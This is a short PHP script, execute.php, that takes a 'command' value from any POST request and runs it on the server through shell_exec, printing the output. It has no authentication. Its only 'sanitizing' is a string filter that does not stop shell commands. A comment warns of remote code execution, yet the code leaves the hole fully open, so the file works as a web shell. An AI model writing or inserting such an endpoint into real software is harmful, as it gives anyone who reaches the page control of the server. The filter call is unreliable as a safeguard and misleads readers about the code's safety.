<?php\n// execute.php\n\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $command = filter_input(INPUT_POST, 'command', FILTER_SANITIZE_STRING);\n\n    // Validate and sanitize command as necessary.\n    // WARNING: Directly executing user input can be dangerous and open to security risks like remote code execution.\n\n    if (empty($command)) {\n        echo "No command provided.";\n        exit;\n    }\n\n    // Execute the command\n    $output = shell_exec($command);\n\n    // Output the result\n    echo "<pre>$output</pre>";\n}\n?>